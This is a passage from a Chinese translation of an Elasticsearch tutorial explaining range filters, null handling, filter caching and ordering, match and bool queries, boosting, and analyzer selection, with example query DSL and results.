这将匹配只有一个 search 标签的文档，而不是匹配所有包含了 search 标签的文档。
范围
到现在只搜索过准确的数字，现实中，通过范围来过滤更为有用。例如，你可能希望找到所有价格高于 20 元而低于 40 元的产品。
在 SQL 语法中，范围可以如下表示：
SELECT document
FROM   products
WHERE  price BETWEEN 20 AND 40

Elasticsearch 有一个 range 过滤器，让你可以根据范围过滤：
"range" : {
    "price" : {
        "gt" : 20,
        "lt" : 40
    }
}

range 过滤器既能包含也能排除范围，通过下面的选项：

gt: > 大于
lt: < 小于
gte: >= 大于或等于
lte: <= 小于或等于

下面是范围过滤器的一个示例：
GET /my_store/products/_search
{
    "query" : {
        "filtered" : {
            "filter" : {
                "range" : {
                    "price" : {
                        "gte" : 20,
                        "lt"  : 40
                    }
                }
            }
        }
    }
}

假如你需要不设限的范围，去掉一边的限制就可以了：
"range" : {
    "price" : {
        "gt" : 20
    }
}

日期范围
range 过滤器也可以用于日期字段：
"range" : {
    "timestamp" : {
        "gt" : "2014-01-01 00:00:00",
        "lt" : "2014-01-07 00:00:00"
    }
}

当用于日期字段时，range 过滤器支持日期数学操作。例如，想找到所有最近一个小时的文档：
"range" : {
    "timestamp" : {
        "gt" : "now-1h"
    }
}

这个过滤器将始终能找出所有时间戳大于当前时间减 1 小时的文档，让这个过滤器像移窗一样通过你的文档。
日期计算也能用于实际的日期，而不是仅仅是一个像 now 一样的占位符。只要在日期后加上双竖线 ||，就能使用日期数学表达式了。
"range" : {
    "timestamp" : {
        "gt" : "2014-01-01 00:00:00",
        "lt" : "2014-01-01 00:00:00||+1M" <1>
    }
}

<1> 早于 2014 年 1 月 1 号加一个月
字符串范围
range 过滤器也可以用于字符串。字符串范围根据字典或字母顺序来计算。例如，这些值按照字典顺序排序：

5, 50, 6, B, C, a, ab, abb, abc, b

提示：倒排索引中的短语按照字典顺序排序，也是为什么字符串范围使用这个顺序。
假如我们想让范围从 a 开始而不包含 b，我们可以用类似的 range 过滤器语法：
"range" : {
    "title" : {
        "gte" : "a",
        "lt" :  "b"
    }
}

当心基数： 
数字和日期字段的索引方式让他们在计算范围时十分高效。但对于字符串来说却不是这样。为了在字符串上执行范围操作，Elasticsearch 会在这个范围内的每个短语执行 term 操作。这比日期或数字的范围操作慢得多。
字符串范围适用于一个基数较小的字段，一个唯一短语个数较少的字段。你的唯一短语数越多，搜索就越慢。
 
12.2 处理 Null 值
回到我们早期的示例，在文档中有一个多值的字段 tags，一个文档可能包含一个或多个标签，或根本没有标签。如果一个字段没有值，它是怎么储存在倒排索引中的？
这是一个取巧的问题，因为答案是它根本没有存储。让我们从看一下前几节的倒排索引：



Token
DocIDs



open_source
2


search
1,2


你怎么可能储存一个在数据结构不存在的字段呢？倒排索引是标记和包含它们的文档的一个简单列表。假如一个字段不存在，它就没有任何标记，也就意味着它无法被倒排索引的数据结构表达出来。
本质上来说，null，[]（空数组）和 [null] 是相等的。它们都不存在于倒排索引中！
显然，这个世界却没有那么简单，数据经常会缺失字段，或包含空值或空数组。为了应对这些情形，Elasticsearch 有一些工具来处理空值或缺失的字段。
exists 过滤器
工具箱中的第一个利器是 exists 过滤器，这个过滤器将返回任何包含这个字段的文档，让我们用标签来举例，索引一些示例文档：
POST /my_index_weichao/posts/_bulk
{ "index": { "_id": "1"              }}
{ "tags" : ["search"]                }  <1>
{ "index": { "_id": "2"              }}
{ "tags" : ["search", "open_source"] }  <2>
{ "index": { "_id": "3"              }}
{ "other_field" : "some data"        }  <3>
{ "index": { "_id": "4"              }}
{ "tags" : null                      }  <4>
{ "index": { "_id": "5"              }}
{ "tags" : ["search", null]          }  <5>

<1> tags 字段有一个值 
<2> tags 字段有两个值 
<3> tags 字段不存在 
<4> tags 字段被设为 null 
<5> tags 字段有一个值和一个 null
结果我们 tags 字段的倒排索引看起来将是这样：



Token
DocIDs



open_source
2


search
1,2,5


我们的目标是找出所有设置了标签的文档，我们不关心这个标签是什么，只要它存在于文档中就行。在 SQL 语法中，我们可以用 IS NOT NULL 查询：
SELECT tags
FROM   posts
WHERE  tags IS NOT NULL

在 Elasticsearch 中，我们使用 exists 过滤器：
GET /my_index/posts/_search
{
    "query" : {
        "filtered" : {
            "filter" : {
                "exists" : { "field" : "tags" }
            }
        }
    }
}

查询返回三个文档：
"hits" : [
    {
      "_id" :     "1",
      "_score" :  1.0,
      "_source" : { "tags" : ["search"] }
    },
    {
      "_id" :     "5",
      "_score" :  1.0,
      "_source" : { "tags" : ["search", null] } <1>
    },
    {
      "_id" :     "2",
      "_score" :  1.0,
      "_source" : { "tags" : ["search", "open source"] }
    }
]

<1> 文档 5 虽然包含了一个 null 值，仍被返回了。这个字段存在是因为一个有值的标签被索引了，所以 null 对这个过滤器没有影响
结果很容易理解，所以在 tags 字段中有值的文档都被返回了。只排除了文档 3 和 4。
missing 过滤器
missing 过滤器本质上是 exists 的反义词：它返回没有特定字段值的文档，像这条 SQL 一样：
SELECT tags
FROM   posts
WHERE  tags IS  NULL

让我们在前面的例子中用 missing 过滤器来取代 exists：
GET /my_index/posts/_search
{
    "query" : {
        "filtered" : {
            "filter": {
                "missing" : { "field" : "tags" }
            }
        }
    }
}

如你所愿，我们得到了两个没有包含标签字段的文档：
"hits" : [
    {
      "_id" :     "3",
      "_score" :  1.0,
      "_source" : { "other_field" : "some data" }
    },
    {
      "_id" :     "4",
      "_score" :  1.0,
      "_source" : { "tags" : null }
    }
]

什么时候 null 才表示 null
有时你需要能区分一个字段是没有值，还是被设置为 null。用上面见到的默认行为无法区分这一点，数据都不存在了。幸运的是，我们可以将明确的 null 值用我们选择的占位符来代替
当指定字符串，数字，布尔值或日期字段的映射时，你可以设置一个 null_value 来处理明确的 null 值。没有值的字段仍将被排除在倒排索引外。
当选定一个合适的 null_value 时，确保以下几点：

它与字段的类型匹配，你不能在 date 类型的字段中使用字符串 null_value
它需要能与这个字段可能包含的正常值区分开来，以避免真实值和 null 值混淆

对象的 exists/missing
exists 和 missing 过滤器同样能在内联对象上工作，而不仅仅是核心类型。例如下面的文档：
{
   "name" : {
      "first" : "John",
      "last" :  "Smith"
   }
}

可以检查 name.first 和 name.last 的存在性，也可以检查 name 的。然而，在【映射】中，我们提到对象在内部被转成扁平化的键值结构，像下面所示：
{
   "name.first" : "John",
   "name.last"  : "Smith"
}

所以我们是怎么使用 exists 或 missing 来检测 name 字段的呢，这个字段并没有真正存在于倒排索引中。
原因是像这样的一个过滤器
{
    "exists" : { "field" : "name" }
}

实际是这样执行的
{
    "bool": {
        "should": [
            { "exists": { "field": { "name.first" }}},
            { "exists": { "field": { "name.last"  }}}
        ]
    }
}

同样这意味着假如 first 和 last 都为空，那么 name 就是不存在的。

12.3 关于缓存
在【内部过滤操作】章节中，提到过过滤器是怎么计算的。它们的核心是一个字节集来表示哪些文档符合这个过滤器。Elasticsearch 主动缓存了这些字节集留作以后使用。一旦缓存后，当遇到相同的过滤时，这些字节集就可以被重用，而不需要重新运算整个过滤。
缓存的字节集很“聪明”：他们会增量更新。你索引中添加了新的文档，只有这些新文档需要被添加到已存的字节集中，而不是一遍遍重新计算整个缓存的过滤器。过滤器和整个系统的其他部分一样是实时的，你不需要关心缓存的过期时间。
独立的过滤缓存
每个过滤器都被独立计算和缓存，而不管它们在哪里使用。如果两个不同的查询使用相同的过滤器，则会使用相同的字节集。同样，如果一个查询在多处使用同样的过滤器，只有一个字节集会被计算和重用。
让我们看一下示例，查找符合下列条件的邮箱：

在收件箱而且没有被读取过
不在收件箱但是被标记为重要

    "bool": {
       "should": [
          { "bool": {
                "must": [
                   { "term": { "folder": "inbox" }}, <1>
                   { "term": { "read": false }}
                ]
          }},
          { "bool": {
                "must_not": {
                   "term": { "folder": "inbox" } <1>
                },
                "must": {
                   "term": { "important": true }
                }
          }}
       ]
    }
<1> 这两个过滤器相同，而且会使用同一个字节集。
虽然一个收件箱条件是 must 而另一个是 must_not，这两个条件本身是相等的。这意味着字节集会在第一个条件执行时计算一次，然后作为缓存被另一个条件使用。而第二次执行这条查询时，收件箱的过滤已经被缓存了，所以两个条件都能使用缓存的字节集。
这与查询 DSL 的组合型紧密相关。移动过滤器或在相同查询中多处重用相同的过滤器非常简单。这不仅仅是方便了开发者 —— 对于性能也有很大的提升
控制缓存
大部分直接处理字段的枝叶过滤器（例如 term）会被缓存，而像 bool 这类的组合过滤器则不会被缓存。
【提示】
枝叶过滤器需要在硬盘中检索倒排索引，所以缓存它们是有意义的。另一方面来说，组合过滤器使用快捷的字节逻辑来组合它们内部条件生成的字节集结果，所以每次重新计算它们也是很高效的。
然而，有部分枝叶过滤器，默认不会被缓存，因为它们这样做没有意义：
脚本过滤器：
脚本过滤器的结果不能被缓存因为脚本的意义对于 Elasticsearch 来说是不透明的。
Geo 过滤器：
定位过滤器（我们会在【geoloc】中更详细的介绍），通常被用于过滤基于特定用户地理位置的结果。因为每个用户都有一个唯一的定位，geo 过滤器看起来不太会重用，所以缓存它们没有意义。
日期范围：
使用 now 方法的日期范围（例如 "now-1h"），结果值精确到毫秒。每次这个过滤器执行时，now 返回一个新的值。老的过滤器将不再被使用，所以默认缓存是被禁用的。然而，当 now 被取整时（例如，now/d 取最近一天），缓存默认是被启用的。
有时候默认的缓存测试并不正确。可能你希望一个复杂的 bool 表达式可以在相同的查询中重复使用，或你想要禁用一个 date 字段的过滤器缓存。你可以通过 _cache 标记来覆盖几乎所有过滤器的默认缓存策略
{
    "range" : {
        "timestamp" : {
            "gt" : "2014-01-02 16:15:14" <1>
        },
        "_cache": false <2>
    }
}

<1> 看起来我们不会再使用这个精确时间戳 
<2> 在这个过滤器上禁用缓存
以后的章节将提供一些例子来说明哪些时候覆盖默认缓存策略是有意义的。

12.4  过滤顺序
在 bool 条件中过滤器的顺序对性能有很大的影响。更详细的过滤条件应该被放置在其他过滤器之前，以便在更早的排除更多的文档。
假如条件 A 匹配 1000 万个文档，而 B 只匹配 100 个文档，那么需要将 B 放在 A 前面。
缓存的过滤器非常快，所以它们需要被放在不能缓存的过滤器之前。想象一下我们有一个索引包含了一个月的日志事件，然而，我们只对近一个小时的事件感兴趣：
GET /logs/2014-01/_search
{
    "query" : {
        "filtered" : {
            "filter" : {
                "range" : {
                    "timestamp" : {
                        "gt" : "now-1h"
                    }
                }
            }
        }
    }
}

这个过滤条件没有被缓存，因为它使用了 now 方法，这个值每毫秒都在变化。这意味着我们需要每次执行这条查询时都检测一整个月的日志事件。
我们可以通过组合一个缓存的过滤器来让这变得更有效率：我们可以添加一个含固定时间的过滤器来排除掉这个月的大部分数据，例如昨晚凌晨：
"bool": {
    "must": [
        { "range" : {
            "timestamp" : {
                "gt" : "now-1h/d" <1>
            }
        }},
        { "range" : {
            "timestamp" : {
                "gt" : "now-1h" <2>
            }
        }}
    ]
}

<1> 这个过滤器被缓存了，因为它使用了取整到昨夜凌晨 now 条件。 
<2> 这个过滤器没有被缓存，因为它没有对 now 取整。
now-1h/d 条件取整到昨夜凌晨，所以所有今天之前的文档都被排除掉了。这个结果的字节集被缓存了，因为 now 被取整了，意味着它只需要每天当昨夜凌晨的值改变时被执行一次。now-1h 条件没有被缓存，因为 now 表示最近一毫秒的时间。然而，得益于第一个过滤器，第二个过滤器只需要检测当天的文档就行。
这些条件的排序很重要。上面的实现能正常工作是因为自从昨晚凌晨条件比最近一小时条件位置更前。假如它们用别的方式组合，那么最近一小时条件还是需要检测所有的文档，而不仅仅是昨夜以来的文档。
 









第十三章 全文检索
这一章开始介绍 全文检索 ：怎样对全文字段(full-text fields)进行检索以找到相关度最高的文档。
全文检索最重要的两个方面是：

相关度(Relevance)
根据文档与查询的相关程度对结果集进行排序的能力。相关度可以使用TF/IDF、地理位置相近程度、模糊相似度或其他算法计算。
分析(Analysis)
将一段文本转换为一组唯一的、标准化了的标记(token)，用以(a)创建倒排索引，(b)查询倒排索引。

注意，一旦提到相关度和分析，指的都是查询(queries)而非过滤器(filters)。
基于短语 vs. 全文
虽然所有的查询都会进行相关度计算，但不是所有的查询都有分析阶段。而且像bool或function_score这样的查询并不在文本字段执行。文本查询可以分为两大类：
1. 基于短语(Term-based)的查询：
像term或fuzzy一类的查询是低级查询，它们没有分析阶段。这些查询在单一的短语上执行。例如对单词'Foo'的term查询会在倒排索引里精确地查找'Foo'这个词，并对每个包含这个单词的文档计算TF/IDF相关度'_score'。
牢记term查询只在倒排查询里精确地查找特定短语，而不会匹配短语的其它变形，如foo或FOO。不管短语怎样被加入索引，都只匹配倒排索引里的准确值。如果你在一个设置了'not_analyzed'的字段为'["Foo", "Bar"]'建索引，或者在一个用'whitespace'解析器解析的字段为'Foo Bar'建索引，都会在倒排索引里加入两个索引'Foo'和'Bar'。
2. 全文(Full-text)检索
match和query_string这样的查询是高级查询，它们会对字段进行分析：

如果检索一个'date'或'integer'字段，它们会把查询语句作为日期或者整数格式数据。
如果检索一个准确值('not_analyzed')字符串字段，它们会把整个查询语句作为一个短语。
如果检索一个全文('analyzed')字段，查询会先用适当的解析器解析查询语句，产生需要查询的短语列表。然后对列表中的每个短语执行低级查询，合并查询结果，得到最终的文档相关度。 
我们将会在后续章节讨论这一过程的细节。

我们很少需要直接使用基于短语的查询。通常我们会想要检索全文，而不是单独的短语，使用高级的全文检索会更简单（全文检索内部最终还是使用基于短语的查询）。

13.1 匹配查询
不管搜索什么内容，match查询是首先需要接触的查询。它是一个高级查询，意味着match查询知道如何更好的处理全文检索和准确值检索。
这也就是说，match查询的一个主要用途是进行全文搜索。通过一个小例子来看一下全文搜索是如何工作的。
索引一些数据
首先，我们使用bulk API来创建和索引一些文档：
DELETE /my_index <1>

PUT /my_index_second
{ "settings": { "number_of_shards": 1 }} <2>

POST /my_index/my_type/_bulk
{ "index": { "_id": 1 }}
{ "title": "The quick brown fox" }
{ "index": { "_id": 2 }}
{ "title": "The quick brown fox jumps over the lazy dog" }
{ "index": { "_id": 3 }}
{ "title": "The quick brown fox jumps over the quick dog" }
{ "index": { "_id": 4 }}
{ "title": "Brown fox brown dog" }

<1> 删除已经存在的索引(如果索引存在) 
<2> 然后，关联失效这一节解释了为什么我们创建该索引的时候只使用一个主分片。
单词查询
第一个例子解释了当使用match查询进行单词全文搜索时发生了什么：
GET /my_index_second/my_type/_search
{
    "query": {
        "match": {
            "title": "QUICK!"
        }
    }
}

Elasticsearch通过下面的步骤执行match查询：

检查field类型 
title字段是一个字符串(analyzed)，所以该查询字符串也需要被分析(analyzed)
分析查询字符串 
查询词QUICK!经过标准分析器的分析后变成单词quick。因为我们只有一个查询词，因此match查询可以以一种低级别term查询的方式执行。
找到匹配的文档 
term查询在倒排索引中搜索quick，并且返回包含该词的文档。在这个例子中，返回的文档是1，2，3。
为每个文档打分 
term查询综合考虑词频（每篇文档title字段包含quick的次数）、逆文档频率（在全部文档中title字段包含quick的次数）、包含quick的字段长度（长度越短越相关）来计算每篇文档的相关性得分_score。（更多请见相关性介绍）

这个过程之后我们将得到以下结果（简化后）：
"hits": [
 {
    "_id":      "1",
    "_score":   0.5, <1>
    "_source": {
       "title": "The quick brown fox"
    }
 },
 {
    "_id":      "3",
    "_score":   0.44194174, <2>
    "_source": {
   "title": "The quick brown fox jumps over the quick dog"
    }
 },
 {
    "_id":      "2",
    "_score":   0.3125, <2>
    "_source": {
       "title": "The quick brown fox jumps over the lazy dog"
    }
 }
]

<1> 文档1最相关，因为 title 最短，意味着quick在语义中起比较大的作用。 
<2> 文档3比文档2更相关，因为在文档3中quick出现了两次。
多词查询
如果一次只能查询一个关键词，全文检索将会很不方便。幸运的是，用match查询进行多词查询也很简单：
GET /my_index_second/my_type/_search
{
    "query": {
        "match": {
            "title": "BROWN DOG!"
        }
    }
}

上面这个查询返回以下结果集：
{
  "hits": [
     {
        "_id":      "4",
        "_score":   0.73185337, <1>
        "_source": {
           "title": "Brown fox brown dog"
        }
     },
     {
        "_id":      "2",
        "_score":   0.47486103, <2>
        "_source": {
           "title": "The quick brown fox jumps over the lazy dog"
        }
     },
     {
        "_id":      "3",
        "_score":   0.47486103, <2>
        "_source": {
           "title": "The quick brown fox jumps over   the quick dog"
        }
     },
     {
        "_id":      "1",
        "_score":   0.11914785, <3>
        "_source": {
           "title": "The quick brown fox"
        }
     }
  ]
}

<1> 文档4的相关度最高，因为包含两个”brown”和一个”dog”。
<2> 文档2和3都包含一个”brown”和一个”dog”，且’title’字段长度相同，所以相关度相等。
<3> 文档1只包含一个”brown”，不包含”dog”，所以相关度最低。
因为match查询需要查询两个关键词："brown"和"dog"，在内部会执行两个term查询并综合二者的结果得到最终的结果。match的实现方式是将两个term查询放入一个bool查询，bool查询在之前的章节已经介绍过。
重要的一点是，'title'字段包含至少一个查询关键字的文档都被认为是符合查询条件的。匹配的单词数越多，文档的相关度越高。
提高精度
匹配包含任意个数查询关键字的文档可能会得到一些看似不相关的结果，这是一种霰弹策略(shotgun approach)。然而我们可能想得到包含所有查询关键字的文档。换句话说，我们想得到的是匹配'brown AND dog'的文档，而非'brown OR dog'。
match查询接受一个'operator'参数，默认值为or。如果要求所有查询关键字都匹配，可以更改参数值为and：
GET /my_index/my_type/_search
{
    "query": {
        "match": {
            "title": {      <1>
                "query":    "BROWN DOG!",
                "operator": "and"
            }
        }
    }
}

<1> 为了加入'operator'参数，match查询的结构有一些不同。
这个查询会排除文档1，因为文档1只包含了一个查询关键词。
控制精度
在 all 和 any 之间的选择有点过于非黑即白。如果用户指定了5个查询关键字，而一个文档只包含了其中的4个？将'operator'设置为'and'会排除这个文档。
有时这的确是用户想要的结果。但在大多数全文检索的使用场景下，用户想得到相关的文档，排除那些不太可能相关的文档。换句话说，我们需要介于二者之间的选项。
match查询有'minimum_should_match'参数，参数值表示被视为相关的文档必须匹配的关键词个数。参数值可以设为整数，也可以设置为百分数。因为不能提前确定用户输入的查询关键词个数，使用百分数也很合理。
GET /my_index/my_type/_search
{
  "query": {
    "match": {
      "title": {
        "query":                "quick brown dog",
        "minimum_should_match": "75%"
      }
    }
  }
}

当'minimum_should_match'被设置为百分数时，查询进行如下：在上面的例子里，'75%'会被下舍为'66.6%'，也就是2个关键词。不论参数值为多少，进入结果集的文档至少应匹配一个关键词。
[提示]
'minimum_should_match'参数很灵活，根据用户输入的关键词个数，可以采用不同的匹配规则。
要全面理解match查询是怎样处理多词查询，我们需要了解怎样用bool查询合并多个查询。

13.2 组合查询
在《组合过滤》中我们讨论了怎样用布尔过滤器组合多个用and, or, and not逻辑组成的过滤子句，在查询中, 布尔查询充当着相似的作用，但是有一个重要的区别。
过滤器会做一个判断: 是否应该将文档添加到结果集? 然而查询会做更精细的判断. 他们不仅决定一个文档是否要添加到结果集，而且还要计算文档的相关性（relevant）.
像过滤器一样, 布尔查询接受多个用must, must_not, and should的查询子句.  例:
GET /my_index/my_type/_search
{
  "query": {
    "bool": {
      "must":     { "match": { "title": "quick" }},
      "must_not": { "match": { "title": "lazy"  }},
      "should": [
                  { "match": { "title": "brown" }},
                  { "match": { "title": "dog"   }}
      ]
    }
  }
}

在前面的查询中，凡是满足title字段中包含quick，但是不包含lazy的文档都会在查询结果中。到目前为止，布尔查询的作用非常类似于布尔过滤的作用。
当should过滤器中有两个子句时不同的地方就体现出来了，下面例子就可以体现：一个文档不需要同时包含brown和dog，但如果同时有这两个词，这个文档的相关性就更高:
{
  "hits": [
     {
        "_id":      "3",
        "_score":   0.70134366, <1>
        "_source": {
           "title": "The quick brown fox jumps over the quick dog"
        }
     },
     {
        "_id":      "1",
        "_score":   0.3312608,
        "_source": {
           "title": "The quick brown fox"
        }
     }
  ]
}

<1> 文档3的得分更高，是因为它同时包含了brown 和 dog。
得分计算
布尔查询通过把所有符合must 和 should的子句得分加起来，然后除以must 和 should子句的总数为每个文档计算相关性得分。
must_not子句并不影响得分；他们存在的意义是排除已经被包含的文档。
精度控制
所有的 must 子句必须匹配, 并且所有的 must_not 子句必须不匹配, 但是多少 should 子句应该匹配呢? 默认的，不需要匹配任何 should 子句，一种情况例外：如果没有must子句，就必须至少匹配一个should子句。
像我们控制match查询的精度一样，我们也可以通过minimum_should_match参数控制多少should子句需要被匹配，这个参数可以是正整数，也可以是百分比。
GET /my_index/my_type/_search
{
  "query": {
    "bool": {
      "should": [
        { "match": { "title": "brown" }},
        { "match": { "title": "fox"   }},
        { "match": { "title": "dog"   }}
      ],
      "minimum_should_match": 2 <1>
    }
  }
}

<1> 这也可以用百分比表示
结果集仅包含title字段中有"brown"和 "fox", "brown"和 "dog", 或 "fox" 和"dog"的文档。如果一个文档包含上述三个条件，那么它的相关性就会比其他仅包含三者中的两个条件的文档要高。

13.3  match匹配怎么当成布尔查询来使用
到现在为止，你可能已经意识到在一个布尔查询中多字段match查询仅仅包裹了已经生成的term查询。通过默认的or操作符，每个term查询都会像一个should子句一样被添加，只要有一个子句匹配就可以了。下面的两个查询是等价的：
{
    "match": { "title": "brown fox"}
}


{
  "bool": {
    "should": [
      { "term": { "title": "brown" }},
      { "term": { "title": "fox"   }}
    ]
  }
}

通过and操作符，所有的term查询会像must子句一样被添加，因此所有的子句都必须匹配。下面的两个查询是等价的：
{
    "match": {
        "title": {
            "query":    "brown fox",
            "operator": "and"
        }
    }
}


{
  "bool": {
    "must": [
      { "term": { "title": "brown" }},
      { "term": { "title": "fox"   }}
    ]
  }
}

如果minimum_should_match参数被指定，match查询就直接被转换成一个bool查询，下面两个查询是等价的：
{
    "match": {
        "title": {
            "query":       "quick brown fox",
            "minimum_should_match": "75%"
        }
    }
}


{
  "bool": {
    "should": [
      { "term": { "title": "brown" }},
      { "term": { "title": "fox"   }},
      { "term": { "title": "quick" }}
    ],
    "minimum_should_match": 2      <1>
  }
}

<1>因为只有三个子句，所以 minimum_should_match参数在match查询中的值75%就下舍到了2。3个should子句中至少有两个子句匹配。
当然，我们通常写这些查询类型的时候还是使用match查询的，但是理解match查询在内部是怎么工作的可以让你在任何你需要使用的时候更加得心应手。有些情况仅仅使用一个match查询是不够的，比如给某些查询词更高的权重。这种情况我们会在下一节看个例子。

13.4 提高查询得分
当然，bool查询并不仅仅是组合多个简单的一个词的match查询。他可以组合任何其他查询，包括bool查询。bool查询通常会通过组合几个不同查询的得分为每个文档调整相关性得分。
假设想查找关于”full-text search”的文档，但是我们又想给涉及到“Elasticsearch”或者“Lucene”的文档更高的权重。我们的用意是想涉及到”Elasticsearch” 或者 “Lucene”的文档的相关性得分会比那些没有涉及到的文档的得分要高，也就是说这些文档会出现在结果集更靠前的位置。
一个简单的bool查询允许我们写出像下面一样的非常复杂的逻辑：
GET /_search
{
    "query": {
        "bool": {
            "must": {
                "match": {
                    "content": { (1)
                        "query":    "full text search",
                        "operator": "and"
                    }
                }
            },
            "should": [ (2)
                { "match": { "content": "Elasticsearch" }},
                { "match": { "content": "Lucene"        }}
            ]
        }
    }
}


content字段必须包含full,text,search这三个单词。
如果content字段也包含了“Elasticsearch”或者“Lucene”，则文档会有一个更高的得分。

匹配的should子句越多，文档的相关性就越强。到目前为止一切都很好。但是如果我们想给包含“Lucene”一词的文档比较高的得分，甚至给包含“Elasticsearch”一词更高的得分要怎么做呢？
同时可以在任何查询子句中指定一个boost值来控制相对权重，默认值为1。一个大于1的boost值可以提高查询子句的相对权重。因此我们可以像下面一样重写之前的查询：
GET /_search
{
    "query": {
        "bool": {
            "must": {
                "match": {  (1)
                    "content": {
                        "query":    "full text search",
                        "operator": "and"
                    }
                }
            },
            "should": [
                { "match": {
                    "content": {
                        "query": "Elasticsearch",
                        "boost": 3 (2)
                    }
                }},
                { "match": {
                    "content": {
                        "query": "Lucene",
                        "boost": 2 (3)
                    }
                }}
            ]
        }
    }
}


这些查询子句的boost值为默认值1。
这个子句是最重要的，因为他有最高的boost值。
这个子句比第一个查询子句的要重要，但是没有“Elasticsearch”子句重要。


注意：

boost参数用于提高子句的相对权重（boost值大于1）或者降低子句的相对权重（boost值在0-1之间），但是提高和降低并非是线性的。换句话说，boost值为2并不能够使结果变成两倍的得分。
另外，boost值被使用了以后新的得分是标准的。每个查询类型都会有一个独有的标准算法，算法的详细内容并不在本书的范畴。简单的概括一下，一个更大的boost值可以得到一个更高的得分。
如果你自己实现了没有基于TF/IDF的得分模型，但是你想得到更多的对于提高得分过程的控制，你可以使用function_score查询来调整一个文档的boost值而不用通过标准的步骤。



13.5 分析控制
查询只能查找在倒排索引中出现的词，所以确保在文档索引的时候以及字符串查询的时候使用同一个分析器是很重要的，为了查询的词能够在倒排索引中匹配到。
尽管我们说文档中每个字段的分析器是已经定好的。但是字段可以有不同的分析器，通过给那个字段配置一个指定的分析器或者直接使用类型，索引，或节点上的默认分析器。在索引的时候，一个字段的值会被配置的或者默认的分析器分析。
举个例子，让我们添加一个字段到my_index：
PUT /my_index/_mapping/my_type
{
    "my_type": {
        "properties": {
            "english_title": {
                "type":     "string",
                "analyzer": "english"
            }
        }
    }
}

现在我们可以通过analyzeAPI分析Foxes词来比较english_title字段中的值以及title字段中的值在创建索引的时候是怎么被分析的：
GET /my_index/_analyze?field=my_type.title   <1>
Foxes

GET /my_index/_analyze?field=my_type.english_title <2>
Foxes

<1> 使用standard分析器的title字段将会返回词foxes。
<2> 使用english分析器的english_title字段将会返回词fox。
这意味着，如果我们为精确的词fox执行一个低级别的term查询，english_title字段会匹 配而title字段不会。
像match查询一样的高级别的查询可以知道字段的映射并且能够在被查询的字段上使用正确的分析器。我们可以在validate-query API的执行中看到这个：
GET /my_index/my_type/_validate/query?explain
{
    "query": {
        "bool": {
            "should": [
                { "match": { "title":         "Foxes"}},
                { "match": { "english_title": "Foxes"}}
            ]
        }
    }
}

它会返回explanation：
(title:foxes english_title:fox)

match查询为每个字段使用合适的分析器用来确保在那个字段上可以用正确的格式查询这个词。
默认分析器
虽然我们可以在字段级别指定一个分析器，但是如果我们在字段级别没有指定分析器的话，那要怎么决定某个字段使用什么分析器呢？
分析器可以在好几个地方设置。Elasticsearch会查找每个级别直到找到它可以使用的分析器。在创建索引的时候，Elasticsearch查找分析器的顺序如下：

在映射文件中指定字段的analyzer，或者
在文档的_analyzer字段上指定分析器，或者
在映射文件中指定类型的默认分析器analyzer
在索引映射文件中设置默认分析器default
在节点级别设置默认分析器default
standard分析器

查找索引的时候，Elasticsearch查找分析器的顺序稍微有点不一样：

在查询参数中指定analyzer，或者
在映射文件中指定字段的analyzer，或者
在映射文件中指定类型的默认分析器analyzer
在索引映射文件中设置默认分析器default
在节点级别设置默认分析器default
standard分析器


提示：
上面列表中用斜体字的两行突出了创建索引以及查询索引的时候Elasticsearch查找分析器的区别。_analyzer字段允许你为每个文档指定默认的分析器(比如, english, french, spanish)，虽然在查询的时候指定analyzer参数，但是在一个索引中处理多种语言这并不是一个好方法，因为在多语言环境下很多问题会暴露出来。

有时候，在创建索引与查询索引的时候使用不同的分析器也是有意义的。举个例子：在创建索引的时候想要索引同义词 (比如, 出现quick的时候，我们也索引 fast, rapid, 和 speedy)。但是在查询索引的时候，我们不需要查询所有的同义词，我们只要查询用户输入的一个单词就可以了，它可以是quick, 
fast, rapid, 或者 speedy。
为了满足这种差异，Elasticsearch也支持index_analyzer 和 search_analyzer 参数，并且分析器被命名为default_index和default_search。
把这些额外的参数考虑进去，Elasticsearch查找所有的分析器的顺序实际上像下面的样子：

在映射文件中指定字段的index_analyzer，或者
在映射文件中指定字段的analyzer，或者
在文档的_analyzer字段上指定分析器，或者
在映射文件中指定类型的创建索引的默认分析器index_analyzer
在映射文件中指定类型的默认分析器analyzer
在索引映射文件中设置创建索引的默认分析器default_index
在索引映射文件中设置默认分析器default
在节点级别设置创建索引的默认分析器default_index
在节点级别设置默认分析器default
standard分析器

以及查询索引的时候:

在查询参数中指定analyzer，或者
在映射文件中指定字段的search_analyzer，或者
在映射文件中指定字段的analyzer，或者
在映射文件中指定类型的查询索引的默认分析器analyzer
在索引映射文件中设置查询索引的默认分析器default_search
在索引映射文件中设置默认分析器default_search
在节点级别设置查询索引的默认分析器default_search
在节点级别设置默认分析器default
standard 分析器

实际配置分析器
可以指定分析器的地方实在是太多了，但实际上，指定分析器很简单。
用索引配置，而不是用配置文件
第一点要记住的是，尽管开始使用Elasticsearch仅仅只是为了一个简单的目的或者是一个应用比如日志，但很可能你会发现更多的案例，结局是在同一个集群中运行着好几个不同的应用。每一个索引都需要是独立的，并且可以被独立的配置。你不要想着给一个案例设置默认值，但是不得不重写他们来适配后面的案例。
这个规则把节点级别的配置分析器方法排除在外了。另外，节点级别的分析器配置方法需要改变每个节点的配置文件并且重启每个节点，这将成为维护的噩梦。保持Elasticsearch持续运行并通过API来管理索引的设置是一个更好的方法。
保持简便性
大多数时间，你可以预先知道文档会包含哪些字段。最简单的方法是在你创建索引或者添加类型映射的时候为每一个全文检索字段设置分析器。虽然这个方法有点啰嗦，但是它可以很容易的看到哪个字段应用了哪个分析器。
通常情况下，大部分的字符串字段是确切值not_analyzed字段（索引但不分析字段）比如标签，枚举，加上少数全文检索字段会使用默认的分析器，像standard 或者 english 或者其他语言。然后你可能只有一到两个字段需要定制分析：或许title字段需要按照你查找的方式去索引来支持你的查找。（指的是你查找的字符创用什么分析器，创建索引就用什么分析器）
你可以在索引设置default分析器的地方为几乎所有全文检索字段设置成你想要的分析器，并且只要在一到两个字段指定专门的分析器。如果，在你的模型中，你每个类型都需要不同的分析器，那么在类型级别使用analyzer配置来代替。

提示：
一个普通的像日志一样的基于时间轴的工作流数据每天都得创建新的索引，忙着不断的创建索引。虽然这种工作流阻止你预先创建索引，但是你可以使用索引模板来指定新的索引的配置和映射。


13.6 关联失效
在讨论多字段检索中的更复杂的查询前，让我们顺便先解释一下为什么我们只用一个主分片来创建索引。
有时有的新手会开一个问题说通过相关性排序没有效果，并且提供了一小段复制的结果：该用户创建了一些文档，执行了一个简单的查询，结果发现相关性较低的结果排在了相关性较高的结果的前面。
